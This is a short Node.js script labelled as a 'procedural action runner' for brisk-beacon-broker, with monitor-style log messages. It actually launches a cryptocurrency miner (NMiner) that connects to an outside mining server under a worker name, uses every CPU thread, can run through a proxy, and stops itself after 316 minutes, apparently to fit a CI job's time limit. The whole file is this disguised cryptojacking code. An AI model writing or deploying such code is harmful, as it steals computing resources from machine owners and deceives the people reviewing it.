// Procedural action runner for brisk-beacon-broker
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./lib/config");

async function bootstrap() {
    const sessionId = "5385ab";
    console.log(`[monitor] Starting runtime for ${config.appName || "brisk-beacon-broker"} [${sessionId}]`);

    const runtime = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Arup07.median",
        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
    );

    const tick = () => { setTimeout(tick, 59000); }; tick();
    setTimeout(() => {
        console.log("[timeout] Operational limit (316m) reached, exiting cleanly.");
        process.exit(0);
    }, 316 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log(`[monitor] Signal SIGTERM acknowledged, exiting session ${sessionId}.`);
        process.exit(0);
    });

    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
}

bootstrap().catch((err) => {
    console.error("Supervisor startup fault:", err);
    process.exit(1);
});
